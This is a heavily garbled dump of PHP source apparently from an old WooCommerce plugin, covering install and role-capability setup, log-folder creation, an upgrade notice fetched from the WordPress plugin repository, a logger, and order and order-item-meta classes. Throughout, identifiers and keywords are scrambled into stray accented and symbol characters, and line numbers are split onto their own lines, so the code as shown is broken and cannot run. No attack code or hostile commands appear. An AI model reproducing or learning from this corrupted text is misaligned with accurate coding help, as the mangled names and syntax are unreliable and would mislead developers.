488 'd–‘e_·ges' => 
Œue
,

489 'd–‘e_´iv©e_·ges' => 
Œue
,

490 'd–‘e_´iv©e_po¡s' => 
Œue
,

491 'd–‘e_published_·ges' => 
Œue
,

492 'd–‘e_published_po¡s' => 
Œue
,

493 'd–‘e_Ùh”s_po¡s' => 
Œue
,

494 'd–‘e_Ùh”s_·ges' => 
Œue
,

495 'mªage_ÿ‹gÜ›s' => 
Œue
,

496 'mªage_lšks' => 
Œue
,

497 'mod”©e_comm’ts' => 
Œue
,

498 'unf‹»d_html' => 
Œue
,

499 'u¶ßd_fes' => 
Œue
,

500 'expÜt' => 
Œue
,

501 'impÜt' => 
Œue
,

502 'li¡_u£rs' => 
Œue


505 
$ÿ·b™›s
 = 
$this
->
	`g‘_cÜe_ÿ·b™›s
();

507 
	`fÜ—ch
 ( 
$ÿ·b™›s
 
as
 
$ÿp_group
 ) {

508 
	`fÜ—ch
 ( 
$ÿp_group
 
as
 
$ÿp
 ) {

509 
$wp_rŞes
->
	`add_ÿp
Ğ'shİ_mªag”', 
$ÿp
 );

510 
$wp_rŞes
->
	`add_ÿp
Ğ'admši¡¿tÜ', 
$ÿp
 );

514 
	}
}

522 
public
 
funùiÚ
 
	$g‘_cÜe_ÿ·b™›s
() {

523 
$ÿ·b™›s
 = 
	`¬¿y
();

525 
$ÿ·b™›s
['cÜe'] = 
	`¬¿y
(

530 
$ÿ·b™y_ty³s
 = 
	`¬¿y
( 'product', 'shop_order', 'shop_coupon' );

532 
	`fÜ—ch
 ( 
$ÿ·b™y_ty³s
 
as
 
$ÿ·b™y_ty³
 ) {

534 
$ÿ·b™›s
[ 
$ÿ·b™y_ty³
 ] = 
	`¬¿y
(

558  
$ÿ·b™›s
;

559 
	}
}

567 
public
 
funùiÚ
 
	$»move_rŞes
() {

568 
glob®
 
$wp_rŞes
;

570 iàĞ
	`şass_exi¡s
( 'WP_Roles' ) ) {

571 iàĞ! 
	`is£t
Ğ
$wp_rŞes
 ) ) {

572 
$wp_rŞes
 = 
Ãw
 
	`WP_RŞes
();

576 iàĞ
	`is_objeù
Ğ
$wp_rŞes
 ) ) {

578 
$ÿ·b™›s
 = 
$this
->
	`g‘_cÜe_ÿ·b™›s
();

580 
	`fÜ—ch
 ( 
$ÿ·b™›s
 
as
 
$ÿp_group
 ) {

581 
	`fÜ—ch
 ( 
$ÿp_group
 
as
 
$ÿp
 ) {

582 
$wp_rŞes
->
	`»move_ÿp
Ğ'shİ_mªag”', 
$ÿp
 );

583 
$wp_rŞes
->
	`»move_ÿp
Ğ'admši¡¿tÜ', 
$ÿp
 );

587 
	`»move_rŞe
( 'customer' );

588 
	`»move_rŞe
( 'shop_manager' );

590 
	}
}

595 
´iv©e
 
funùiÚ
 
	$ü—‹_fes
() {

597 
$u¶ßd_dœ
 = 
	`wp_u¶ßd_dœ
();

599 
$fes
 = 
	`¬¿y
(

600 
	`¬¿y
(

601 'ba£' => 
$u¶ßd_dœ
['basedir'] . '/woocommerce_uploads',

605 
	`¬¿y
(

606 'ba£' => 
$u¶ßd_dœ
['basedir'] . '/woocommerce_uploads',

610 
	`¬¿y
(

611 'ba£' => 
WP_PLUGIN_DIR
 . "/" . 
	`¶ugš_ba£Çme
Ğ
	`dœÇme
ĞdœÇmeĞ
__FILE__
 ) ) ) . '/logs',

615 
	`¬¿y
(

616 'ba£' => 
WP_PLUGIN_DIR
 . "/" . 
	`¶ugš_ba£Çme
Ğ
	`dœÇme
ĞdœÇmeĞ
__FILE__
 ) ) ) . '/logs',

622 
	`fÜ—ch
 ( 
$fes
 
as
 
$fe
 ) {

623 iàĞ
	`wp_mkdœ_p
Ğ
$fe
['ba£'] ) && ! 
	`fe_exi¡s
Ğ
	`Œašg¦ash™
( $file['base'] ) . $file['file'] ) ) {

624 iàĞ
$fe_hªdË
 = @
	`fİ’
Ğ
	`Œašg¦ash™
Ğ
$fe
['base'] ) . $file['file'], 'w' ) ) {

625 
	`fwr™e
Ğ
$fe_hªdË
, 
$fe
['content'] );

626 
	`fşo£
Ğ
$fe_hªdË
 );

630 
	}
}

635 
´iv©e
 
funùiÚ
 
	$ü—‹_css_äom_Ëss
() {

637 
$cŞÜs
 = 
	`g‘_İtiÚ
( 'woocommerce_frontend_css_colors' );

639 iàĞĞ! 
	`em±y
Ğ
$cŞÜs
['primary'] ) && !ƒmpty( $colors['secondary'] ) && !ƒmpty( $colors['highlight'] ) && !ƒmpty( $colors['content_bg'] ) && !ƒmpty( $colors['subtext'] ) ) && ( $colors['primary'] != '#ad74a2' || $colors['secondary'] != '#f7f6f7' || $colors['highlight'] != '#85ad74' || $colors['content_bg'] != '#ffffff' || $colors['subtext'] != '#777777' ) ) {

640 iàĞ! 
	`funùiÚ_exi¡s
( 'woocommerce_compile_less_styles' ) ) {

641 
	`šşude_Úû
( 'admin/wc-admin-functions.php' );

643 
	`woocomm”û_compe_Ëss_¡yËs
();

645 
	}
}

653 
funùiÚ
 
	$´e_upd©e_İtiÚ_aùive_¶ugšs
Ğ
$Ãw_v®ue
 ) {

654 
$Şd_v®ue
 = (
¬¿y
è
	`g‘_İtiÚ
( 'active_plugins' );

656 iàĞ
$Ãw_v®ue
 !=ğ
$Şd_v®ue
 && 
	`š_¬¿y
Ğ
W3TC_FILE
, (
¬¿y
) $new_value ) && in_array( W3TC_FILE, (array) $old_value ) ) {

657 
$this
->
_cÚfig
->
	`£t
Ğ'nÙes.¶ugšs_upd©ed', 
Œue
 );

658 
Œy
 {

659 
$this
->
_cÚfig
->
	`§ve
();

660 } 
	`ÿtch
Ğ
Exû±iÚ
 
$ex
 ) {}

663  
$Ãw_v®ue
;

664 
	}
}

671 
funùiÚ
 
	$š_¶ugš_upd©e_mes§ge
Ğ
$¬gs
 ) {

672 
$Œªs›Á_Çme
 = 'wc_upg¿de_nÙiû_' . 
$¬gs
['Version'];

674 iàĞ
çl£
 ==ğĞ
$upg¿de_nÙiû
 = 
	`g‘_Œªs›Á
Ğ
$Œªs›Á_Çme
 ) ) ) {

676 
$»¥Ú£
 = 
	`wp_»mÙe_g‘
( 'https://plugins.svn.wordpress.org/woocommerce/trunk/readme.txt' );

678 iàĞ! 
	`is_wp_”rÜ
Ğ
$»¥Ú£
 ) && ! 
	`em±y
( $response['body'] ) ) {

681 
$m©ches
 = 
nuÎ
;

682 
$»gexp
 = '~==\s*Upg¿dNÙiû\s*==\s*=\s*(.*)\s*=(.*)(=\s*' . 
	`´eg_quÙe
Ğ
WC_VERSION
 ) . '\s*=|$)~Uis';

683 
$upg¿de_nÙiû
 = '';

685 iàĞ
	`´eg_m©ch
Ğ
$»gexp
, 
$»¥Ú£
['body'], 
$m©ches
 ) ) {

686 
$v”siÚ
 = 
	`Œim
Ğ
$m©ches
[1] );

687 
$nÙiûs
 = (
¬¿y
è
	`´eg_¥l™
('~[\r\n]+~', 
	`Œim
Ğ
$m©ches
[2] ) );

689 iàĞ
	`v”siÚ_com·»
Ğ
WC_VERSION
, 
$v”siÚ
, '<' ) ) {

691 
$upg¿de_nÙiû
 .= '<div class="wc_plugin_upgrade_notice">';

693 
	`fÜ—ch
 ( 
$nÙiûs
 
as
 
$šdex
 => 
$lše
 ) {

694 
$upg¿de_nÙiû
 .ğ
	`wp_k£s_po¡
Ğ
	`´eg_»¶aû
Ğ'~\[([^\]]*)\]\(([^\)]*)\)~', '<¨h»f="${2}">${1}</a>', 
$lše
 ) );

697 
$upg¿de_nÙiû
 .= '</div> ';

701 
	`£t_Œªs›Á
Ğ
$Œªs›Á_Çme
, 
$upg¿de_nÙiû
, 
DAY_IN_SECONDS
 );

705 
echo
 
	`wp_k£s_po¡
Ğ
$upg¿de_nÙiû
 );

706 
	}
}

709 
	g’dif
;

711  
Ãw
 
WC_In¡®l
();

	@includes/class-wc-integrations.php

1 <?
php


13 şas 
	cWC_IÁeg¿tiÚs
 {

16 
v¬
 
	m$š‹g¿tiÚs
 = 
¬¿y
();

24 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

26 
	`do_aùiÚ
( 'woocommerce_integrations_init' );

28 
$lßd_š‹g¿tiÚs
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_š‹g¿tiÚs', 
	`¬¿y
() );

31 
	`fÜ—ch
 ( 
$lßd_š‹g¿tiÚs
 
as
 
$š‹g¿tiÚ
 ) {

33 
$lßd_š‹g¿tiÚ
 = 
Ãw
 
	`$š‹g¿tiÚ
();

35 
$this
->
š‹g¿tiÚs
[ 
$lßd_š‹g¿tiÚ
->
id
 ] = $load_integration;

46 
public
 
funùiÚ
 
	$g‘_š‹g¿tiÚs
() {

47  
$this
->
š‹g¿tiÚs
;

48 
	}
}

	@includes/class-wc-logger.php

1 <?
php


11 şas 
	cWC_Logg”
 {

17 
´iv©e
 
	m$_hªdËs
;

25 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

26 
$this
->
_hªdËs
 = 
	`¬¿y
();

36 
public
 
funùiÚ
 
	$__de¡ruù
() {

37 
	`fÜ—ch
 ( 
$this
->
_hªdËs
 
as
 
$hªdË
 )

38 @
	`fşo£
Ğ
	`esÿ³sh–Ïrg
Ğ
$hªdË
 ) );

39 
	}
}

49 
´iv©e
 
funùiÚ
 
	$İ’
Ğ
$hªdË
 ) {

51 iàĞ
	`is£t
Ğ
$this
->
_hªdËs
[ 
$hªdË
 ] ) )

52  
Œue
;

54 iàĞ
$this
->
_hªdËs
[ 
$hªdË
 ] = @
	`fİ’
Ğ
	`WC
()->
	`¶ugš_·th
(è. '/logs/' . $this->
	`fe_Çme
( $handle ) . '.txt', 'a' ) )

55  
Œue
;

57  
çl£
;

58 
	}
}

69 
public
 
funùiÚ
 
	$add
Ğ
$hªdË
, 
$mes§ge
 ) {

70 iàĞ
$this
->
	`İ’
Ğ
$hªdË
 ) && 
	`is_»sourû
Ğ$this->
_hªdËs
[ $handle ] ) ) {

71 
$time
 = 
	`d©e_i18n
( 'm-d-Y @ H:i:s -' );

72 @
	`fwr™e
Ğ
$this
->
_hªdËs
[ 
$hªdË
 ], 
$time
 . " " . 
$mes§ge
 . "\n" );

74 
	}
}

84 
public
 
funùiÚ
 
	$ş—r
Ğ
$hªdË
 ) {

86 iàĞ
$this
->
	`İ’
Ğ
$hªdË
 ) && 
	`is_»sourû
Ğ$this->
_hªdËs
[ $handle ] ) )

87 @
	`árunÿ‹
Ğ
$this
->
_hªdËs
[ 
$hªdË
 ], 0 );

88 
	}
}

98 
´iv©e
 
funùiÚ
 
	$fe_Çme
Ğ
$hªdË
 ) {

99  
$hªdË
 . '-' . 
	`§n™ize_fe_Çme
Ğ
	`wp_hash
( $handle ) );

100 
	}
}

	@includes/class-wc-order-item-meta.php

1 <?
php


12 şas 
	cWC_Ord”_I‹m_M‘a
 {

14 
public
 
	m$m‘a
;

15 
public
 
	m$´oduù
;

24 
public
 
funùiÚ
 
__cÚ¡ruù
Ğ
$™em_m‘a
 = 
¬¿y
(), 
$´oduù
 = 
nuÎ
 ) {

25 
$this
->
m‘a
 = 
$™em_m‘a
;

26 
	m$this
->
	m´oduù
 = 
$´oduù
;

38 
public
 
funùiÚ
 
di¥Ïy
Ğ
$æ©
 = 
çl£
, 
$»tuº
 = f®£, 
$hid•»fix
 = '_' ) {

40 iàĞ! 
em±y
Ğ
$this
->
m‘a
 ) ) {

42 
$m‘a_li¡
 = 
¬¿y
();

44 
fÜ—ch
 ( 
$this
->
m‘a
 
as
 
$m‘a_key
 => 
$m‘a_v®ues
 ) {

46 iàĞ
em±y
Ğ
$m‘a_v®ues
 ) || ( !ƒm±yĞ
$hid•»fix
 ) && 
sub¡r
Ğ
$m‘a_key
, 0, 1 ) == $hideprefix ) ) {

50 
fÜ—ch
Ğ
$m‘a_v®ues
 
as
 
$m‘a_v®ue
 ) {

53 iàĞ
is_£rŸlized
Ğ
$m‘a_v®ue
 ) ) {

57 
	g$©Œibu‹_key
 = 
u¾decode
Ğ
¡r_»¶aû
Ğ'©Œibu‹_', '', 
$m‘a_key
 ) );

60 iàĞ
xÚomy_exi¡s
Ğ
$©Œibu‹_key
 ) ) {

61 
	g$‹rm
 = 
g‘_‹rm_by
Ğ'¦ug', 
$m‘a_v®ue
, 
$©Œibu‹_key
 );

63 iàĞ! 
is_wp_”rÜ
Ğ
$‹rm
 ) && 
	g$‹rm
->
	gÇme
 ) {

64 
	g$m‘a_v®ue
 = 
$‹rm
->
Çme
;

68 } 
–£if
 ( 
$this
->
´oduù
 ) {

69 
	g$´oduù_©Œibu‹s
 = 
$this
->
´oduù
->
g‘_©Œibu‹s
();

71 iàĞ
is£t
Ğ
$´oduù_©Œibu‹s
[ 
$©Œibu‹_key
 ] ) ) {

72 
	g$m‘a_key
 = 
wc_©Œibu‹_Ïb–
Ğ
$´oduù_©Œibu‹s
[ 
$©Œibu‹_key
 ]['name'] );

76 iàĞ
	g$æ©
 ) {

77 
	g$m‘a_li¡
[] = 
wp_k£s_po¡
Ğ
wc_©Œibu‹_Ïb–
Ğ
$©Œibu‹_key
 ) . ': ' . 
­¶y_f‹rs
Ğ'woocomm”û_Üd”_™em_di¥Ïy_m‘a_v®ue', 
$m‘a_v®ue
 ) );

79 
	g$m‘a_li¡
[] = '

80 <
dt
 
şass
="variation-' . sanitize_html_class( sanitize_text_field( $meta_key ) ) . '">' . wp_kses_post( wc_attribute_label( $attribute_key ) ) . ':</dt>

81 <
dd
 
şass
="v¬ŸtiÚ-' . sª™ize_html_şassĞ§n™ize_‹xt_f›ldĞ$m‘a_key ) ) . '">' . wp_k£s_po¡Ğw·utİĞ­¶y_f‹rsĞ'
woocomm”û_Üd”_™em_di¥Ïy_m‘a_v®ue
', $meta_value ) ) ) . '</dd>

87 iàĞ! Ğ
$m‘a_li¡
 ) )

90 
	g$ouut
 = 
$æ©
 ? '' : '<dl class="variation">';

92 iàĞ
	g$æ©
 )

93 
	g$ouut
 .ğ
im¶ode
Ğ", \n", 
$m‘a_li¡
 );

95 
	g$ouut
 .ğ
im¶ode
Ğ'', 
$m‘a_li¡
 );

97 iàĞ! 
	g$æ©
 )

98 
	g$ouut
 .= '</dl>';

100 iàĞ
	g$»tuº
 )

101  
	g$ouut
;

103 
echo
 
	g$ouut
;

	@includes/class-wc-order.php

1 <?
php


13 şas 
	cWC_Ord”
 {

16 
public
 
	m$id
;

25 
public
 
funùiÚ
 
__cÚ¡ruù
Ğ
$id
 = '' ) {

26 
$this
->
´iûs_šşude_x
 = 
g‘_İtiÚ
('woocomm”û_´iûs_šşude_x'è=ğ'yes' ? 
Œue
 : 
çl£
;

27 
	m$this
->
	mx_di¥Ïy_ÿ¹
 = 
g‘_İtiÚ
( 'woocommerce_tax_display_cart' );

29 
	m$this
->
	mdi¥Ïy_tÙ®s_ex_x
 = 
$this
->
x_di¥Ïy_ÿ¹
 =ğ'exş' ? 
Œue
 : 
çl£
;

30 
	m$this
->
	mdi¥Ïy_ÿ¹_ex_x
 = 
$this
->
x_di¥Ïy_ÿ¹
 =ğ'exş' ? 
Œue
 : 
çl£
;

32 iàĞ
	m$id
 > 0 ) {

33 
	m$this
->
g‘_Üd”
Ğ
$id
 );

45 
public
 
funùiÚ
 
	$g‘_Üd”
Ğ
$id
 = 0 ) {

46 iàĞ! 
$id
 ) {

47  
çl£
;

49 iàĞ
$»suÉ
 = 
	`g‘_po¡
Ğ
$id
 ) ) {

50 
$this
->
	`pİuÏ‹
Ğ
$»suÉ
 );

51  
Œue
;

53  
çl£
;

54 
	}
}

64 
public
 
funùiÚ
 
	$pİuÏ‹
Ğ
$»suÉ
 ) {

66 
$this
->
id
 = 
$»suÉ
->
ID
;

67 
$this
->
Üd”_d©e
 = 
$»suÉ
->
po¡_d©e
;

68 
$this
->
modif›d_d©e
 = 
$»suÉ
->
po¡_modif›d
;

69 
$this
->
cu¡om”_mes§ge
 = 
$»suÉ
->
po¡_exû½t
;

70 
$this
->
cu¡om”_nÙe
 = 
$»suÉ
->
po¡_exû½t
;

71 
$this
->
po¡_¡©us
 = 
$»suÉ
->post_status;

74 iàĞ
	`em±y
Ğ
$this
->
blšg_ema
 ) && !ƒm±yĞ$this->
cu¡om”_u£r
 ) ) {

75 
$u£r
 = 
	`g‘_u£r_by
Ğ'id', 
$this
->
cu¡om”_u£r
 );

76 
$this
->
blšg_ema
 = 
$u£r
->
u£r_ema
;

80 
$‹rms
 = 
	`wp_g‘_objeù_‹rms
Ğ
$this
->
id
, 'shİ_Üd”_¡©us', 
	`¬¿y
( 'fields' => 'slugs' ) );

81 
$this
->
¡©us
 = 
	`is£t
Ğ
$‹rms
[0] ) ? $‹rms[0] : 
	`­¶y_f‹rs
( 'woocommerce_default_order_status', 'pending' );

82 
	}
}

91 
public
 
funùiÚ
 
	$__is£t
Ğ
$key
 ) {

92 iàĞ! 
$this
->
id
 ) {

93  
çl£
;

95  
	`m‘ad©a_exi¡s
Ğ'po¡', 
$this
->
id
, '_' . 
$key
 );

96 
	}
}

105 
public
 
funùiÚ
 
	$__g‘
Ğ
$key
 ) {

107 iàĞ'com¶‘ed_d©e' =ğ
$key
 ) {

108 
$v®ue
 = ( $v®uğ
	`g‘_po¡_m‘a
Ğ
$this
->
id
, '_com¶‘ed_d©e', 
Œue
 ) ) ? $v®u: $this->
modif›d_d©e
;

109 } 
	`–£if
 ( 'u£r_id' =ğ
$key
 ) {

110 
$v®ue
 = ( $v®uğ
	`g‘_po¡_m‘a
Ğ
$this
->
id
, '_cu¡om”_u£r', 
Œue
 ) ) ? 
	`absšt
( $value ) : '';

112 
$v®ue
 = 
	`g‘_po¡_m‘a
Ğ
$this
->
id
, '_' . 
$key
, 
Œue
 );

115  
$v®ue
;

116 
	}
}

125 
public
 
funùiÚ
 
	$key_is_v®id
Ğ
$key
 ) {

126 iàĞ
$key
 =ğ
$this
->
Üd”_key
 ) {

127  
Œue
;

130  
çl£
;

131 
	}
}

141 
public
 
funùiÚ
 
	$g‘_Üd”_numb”
() {

142  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_numb”', 
	`_x
Ğ'#', 'hash befÜÜd”‚umb”', 'woocomm”û' ) . 
$this
->
id
, $this );

143 
	}
}

151 
public
 
funùiÚ
 
	$g‘_fÜm©‹d_blšg_add»ss
() {

152 iàĞ! 
$this
->
fÜm©‹d_blšg_add»ss
 ) {

155 
$add»ss
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_fÜm©‹d_blšg_add»ss', 
	`¬¿y
(

156 'fœ¡_Çme' => 
$this
->
blšg_fœ¡_Çme
,

157 'Ï¡_Çme' => 
$this
->
blšg_Ï¡_Çme
,

158 'com·ny' => 
$this
->
blšg_com·ny
,

159 'add»ss_1' => 
$this
->
blšg_add»ss_1
,

160 'add»ss_2' => 
$this
->
blšg_add»ss_2
,

161 'c™y' => 
$this
->
blšg_c™y
,

162 '¡©e' => 
$this
->
blšg_¡©e
,

163 'po¡code' => 
$this
->
blšg_po¡code
,

164 'couÁry' => 
$this
->
blšg_couÁry


165 ), 
$this
 );

167 
$this
->
fÜm©‹d_blšg_add»ss
 = 
	`WC
()->
couÁr›s
->
	`g‘_fÜm©‹d_add»ss
Ğ
$add»ss
 );

169  
$this
->
fÜm©‹d_blšg_add»ss
;

170 
	}
}

178 
public
 
funùiÚ
 
	$g‘_blšg_add»ss
() {

179 iàĞ! 
$this
->
blšg_add»ss
 ) {

181 
$add»ss
 = 
	`¬¿y
(

182 'add»ss_1' => 
$this
->
blšg_add»ss_1
,

183 'add»ss_2' => 
$this
->
blšg_add»ss_2
,

184 'c™y' => 
$this
->
blšg_c™y
,

185 '¡©e' => 
$this
->
blšg_¡©e
,

186 'po¡code' => 
$this
->
blšg_po¡code
,

187 'couÁry' => 
$this
->
blšg_couÁry


189 
$jošed_add»ss
 = 
	`¬¿y
();

190 
	`fÜ—ch
 ( 
$add»ss
 
as
 
$·¹
 ) {

191 iàĞ! 
	`em±y
Ğ
$·¹
 ) ) {

192 
$jošed_add»ss
[] = 
$·¹
;

195 
$this
->
blšg_add»ss
 = 
	`im¶ode
Ğ', ', 
$jošed_add»ss
 );

197  
$this
->
blšg_add»ss
;

198 
	}
}

200 
public
 
funùiÚ
 
	$g‘_blšg_add»ss_shÜt
() {

201 iàĞ! 
$this
->
blšg_add»ss
 ) {

203 
$add»ss
 = 
	`¬¿y
(

204 'add»ss_1' => 
$this
->
blšg_add»ss_1
,

205 'add»ss_2' => 
$this
->
blšg_add»ss_2


207 
$jošed_add»ss
 = 
	`¬¿y
();

208 
	`fÜ—ch
 ( 
$add»ss
 
as
 
$·¹
 ) {

209 iàĞ! 
	`em±y
Ğ
$·¹
 ) ) {

210 
$jošed_add»ss
[] = 
$·¹
;

213 
$this
->
blšg_add»ss
 = 
	`im¶ode
Ğ', ', 
$jošed_add»ss
 );

215  
$this
->
blšg_add»ss
;

216 
	}
}

224 
public
 
funùiÚ
 
	$g‘_fÜm©‹d_shpšg_add»ss
() {

225 iàĞ! 
$this
->
fÜm©‹d_shpšg_add»ss
 ) {

226 iàĞ
$this
->
shpšg_add»ss_1
 ) {

229 
$add»ss
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_fÜm©‹d_shpšg_add»ss', 
	`¬¿y
(

230 'fœ¡_Çme' => 
$this
->
shpšg_fœ¡_Çme
,

231 'Ï¡_Çme' => 
$this
->
shpšg_Ï¡_Çme
,

232 'com·ny' => 
$this
->
shpšg_com·ny
,

233 'add»ss_1' => 
$this
->
shpšg_add»ss_1
,

234 'add»ss_2' => 
$this
->
shpšg_add»ss_2
,

235 'c™y' => 
$this
->
shpšg_c™y
,

236 '¡©e' => 
$this
->
shpšg_¡©e
,

237 'po¡code' => 
$this
->
shpšg_po¡code
,

238 'couÁry' => 
$this
->
shpšg_couÁry


239 ), 
$this
 );

241 
$this
->
fÜm©‹d_shpšg_add»ss
 = 
	`WC
()->
couÁr›s
->
	`g‘_fÜm©‹d_add»ss
Ğ
$add»ss
 );

244  
$this
->
fÜm©‹d_shpšg_add»ss
;

245 
	}
}

254 
public
 
funùiÚ
 
	$g‘_shpšg_add»ss
() {

255 iàĞ! 
$this
->
shpšg_add»ss
 ) {

256 iàĞ
$this
->
shpšg_add»ss_1
 ) {

258 
$add»ss
 = 
	`¬¿y
(

259 'add»ss_1' => 
$this
->
shpšg_add»ss_1
,

260 'add»ss_2' => 
$this
->
shpšg_add»ss_2
,

261 'c™y' => 
$this
->
shpšg_c™y
,

262 '¡©e' => 
$this
->
shpšg_¡©e
,

263 'po¡code' => 
$this
->
shpšg_po¡code
,

264 'couÁry' => 
$this
->
shpšg_couÁry


266 
$jošed_add»ss
 = 
	`¬¿y
();

267 
	`fÜ—ch
 ( 
$add»ss
 
as
 
$·¹
 ) {

268 iàĞ! 
	`em±y
Ğ
$·¹
 ) ) {

269 
$jošed_add»ss
[] = 
$·¹
;

272 
$this
->
shpšg_add»ss
 = 
	`im¶ode
Ğ', ', 
$jošed_add»ss
 );

275  
$this
->
shpšg_add»ss
;

276 
	}
}

285 
public
 
funùiÚ
 
g‘_™ems
Ğ
$ty³
 = '' ) {

286 
glob®
 
$wpdb
;

288 iàĞ
em±y
Ğ
$ty³
 ) ) {

289 
	g$ty³
 = 
¬¿y
( 'line_item' );

292 iàĞ! 
is_¬¿y
Ğ
$ty³
 ) ) {

293 
	g$ty³
 = 
¬¿y
Ğ
$ty³
 );

296 
	g$ty³
 = 
¬¿y_m­
Ğ'esc_©Œ', 
$ty³
 );

298 
	g$lše_™ems
 = 
$wpdb
->
g‘_»suÉs
Ğ$wpdb->
´•¬e
( "

299 
SELECT
 
Üd”_™em_id
, 
Üd”_™em_Çme
, 
Üd”_™em_ty³


300 
FROM
 {
$wpdb
->
´efix
}
woocomm”û_Üd”_™ems


301 
WHERE
 
Üd”_id
 = %
d


302 
AND
 
Üd”_™em_ty³
 
IN
 ( '" . implode( "','", $type ) . "' )

303 
ORDER
 
BY
 
Üd”_™em_id


306 
$™ems
 = 
¬¿y
();

309 
$»£rved_™em_m‘a_keys
 = 
¬¿y
(

324 
fÜ—ch
 ( 
$lše_™ems
 
as
 
$™em
 ) {

326 
$™ems
[ 
$™em
->
Üd”_™em_id
 ]['Çme'] = $™em->
Üd”_™em_Çme
;

327 
$™ems
[ 
$™em
->
Üd”_™em_id
 ]['ty³'] = $™em->
Üd”_™em_ty³
;

328 
$™ems
[ 
$™em
->
Üd”_™em_id
 ]['™em_m‘a'] = 
$this
->
g‘_™em_m‘a
( $item->order_item_id );

331 
fÜ—ch
 ( 
$™ems
[ 
$™em
->
Üd”_™em_id
 ]['™em_m‘a'] 
as
 
$Çme
 => 
$v®ue
 ) {

332 iàĞ
š_¬¿y
Ğ
$Çme
, 
$»£rved_™em_m‘a_keys
 ) ) {

335 iàĞ'_' ==ğ
sub¡r
Ğ
$Çme
, 0, 1 ) ) {

336 
$™ems
[ 
$™em
->
Üd”_™em_id
 ][ 
sub¡r
Ğ
$Çme
, 1 ) ] = 
$v®ue
[0];

337 } 
–£if
 ( ! 
š_¬¿y
Ğ
$Çme
, 
$»£rved_™em_m‘a_keys
 ) ) {

338 
$™ems
[ 
$™em
->
Üd”_™em_id
 ][ 
$Çme
 ] = 
$v®ue
[0];

343  
­¶y_f‹rs
Ğ'woocomm”û_Üd”_g‘_™ems', 
$™ems
, 
$this
 );

352 
public
 
funùiÚ
 
g‘_™em_couÁ
Ğ
$ty³
 = '' ) {

353 
glob®
 
$wpdb
;

355 iàĞ
em±y
Ğ
$ty³
 ) ) {

356 
$ty³
 = 
¬¿y
( 'line_item' );

359 iàĞ! 
is_¬¿y
Ğ
$ty³
 ) ) {

360 
$ty³
 = 
¬¿y
( $type );

363 
$™ems
 = 
$this
->
g‘_™ems
Ğ
$ty³
 );

365 
$couÁ
 = 0;

367 
fÜ—ch
 ( 
$™ems
 
as
 
$™em
 ) {

368 iàĞ! 
em±y
Ğ
$™em
['qty'] ) ) {

369 
$couÁ
 +ğ
$™em
['qty'];

371 
$couÁ
 ++;

375  
­¶y_f‹rs
Ğ'woocomm”û_g‘_™em_couÁ', 
$couÁ
, 
$ty³
, 
$this
 );

384 
public
 
funùiÚ
 
	$g‘_ães
() {

385  
$this
->
	`g‘_™ems
( 'fee' );

386 
	}
}

394 
public
 
funùiÚ
 
	$g‘_xes
() {

395  
$this
->
	`g‘_™ems
( 'tax' );

396 
	}
}

403 
public
 
funùiÚ
 
	$g‘_shpšg_m‘hods
() {

404  
$this
->
	`g‘_™ems
( 'shipping' );

405 
	}
}

412 
public
 
funùiÚ
 
	$has_shpšg_m‘hod
Ğ
$m‘hod_id
 ) {

413 
$shpšg_m‘hods
 = 
$this
->
	`g‘_shpšg_m‘hods
();

414 
$has_m‘hod
 = 
çl£
;

416 iàĞ! 
$shpšg_m‘hods
 ) {

417  
çl£
;

420 
	`fÜ—ch
 ( 
$shpšg_m‘hods
 
as
 
$shpšg_m‘hod
 ) {

421 iàĞ
$shpšg_m‘hod
['m‘hod_id'] =ğ
$m‘hod_id
 ) {

422 
$has_m‘hod
 = 
Œue
;

426  
$has_m‘hod
;

427 
	}
}

435 
public
 
funùiÚ
 
	$g‘_x_tÙ®s
() {

436 
$xes
 = 
$this
->
	`g‘_™ems
( 'tax' );

437 
$x_tÙ®s
 = 
	`¬¿y
();

439 
	`fÜ—ch
 ( 
$xes
 
as
 
$key
 => 
$x
 ) {

441 
$code
 = 
$x
[ 'name' ];

443 iàĞ! 
	`is£t
Ğ
$x_tÙ®s
[ 
$code
 ] ) ) {

444 
$x_tÙ®s
[ 
$code
 ] = 
Ãw
 
	`¡dCÏss
();

445 
$x_tÙ®s
[ 
$code
 ]->
amouÁ
 = 0;

448 
$x_tÙ®s
[ 
$code
 ]->
is_compound
 = 
$x
[ 'compound' ];

449 
$x_tÙ®s
[ 
$code
 ]->
Ïb–
 = 
	`is£t
Ğ
$x
[ 'label' ] ) ? $tax[ 'label' ] : $tax[ 'name' ];

450 
$x_tÙ®s
[ 
$code
 ]->
amouÁ
 +ğ
$x
[ 'tax_amount' ] + $tax[ 'shipping_tax_amount' ];

451 
$x_tÙ®s
[ 
$code
 ]->
fÜm©‹d_amouÁ
 = 
	`wc_´iû
Ğ
	`wc_round_x_tÙ®
Ğ$x_tÙ®s[ $cod]->
amouÁ
 ), 
	`¬¿y
('cu¼’cy' => 
$this
->
	`g‘_Üd”_cu¼’cy
()) );

454  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_x_tÙ®s', 
$x_tÙ®s
, 
$this
 );

455 
	}
}

463 
public
 
funùiÚ
 
	$has_m‘a
Ğ
$Üd”_™em_id
 ) {

464 
glob®
 
$wpdb
;

466  
$wpdb
->
	`g‘_»suÉs
Ğ$wpdb->
	`´•¬e
( "SELECT meta_key, meta_value, meta_id, order_item_id

467 
FROM
 {
$wpdb
->
´efix
}
woocomm”û_Üd”_™emm‘a
 
WHERE
 
Üd”_™em_id
 = %
d


468 
ORDER
 
BY
 
m‘a_id
",‡bsint( $order_item_id ) ), ARRAY_A );

469 
	}
}

480 
public
 
funùiÚ
 
g‘_™em_m‘a
Ğ
$Üd”_™em_id
, 
$key
 = '', 
$sšgË
 = 
çl£
 ) {

481  
g‘_m‘ad©a
Ğ'Üd”_™em', 
$Üd”_™em_id
, 
$key
, 
$sšgË
 );

492 
public
 
funùiÚ
 
	$g‘_ÿ¹_discouÁ
() {

493  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_amouÁ_ÿ¹_discouÁ', (è
$this
->
ÿ¹_discouÁ
, $this );

494 
	}
}

502 
public
 
funùiÚ
 
	$g‘_Üd”_discouÁ
() {

503  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_amouÁ_Üd”_discouÁ', (è
$this
->
Üd”_discouÁ
, $this );

504 
	}
}

512 
public
 
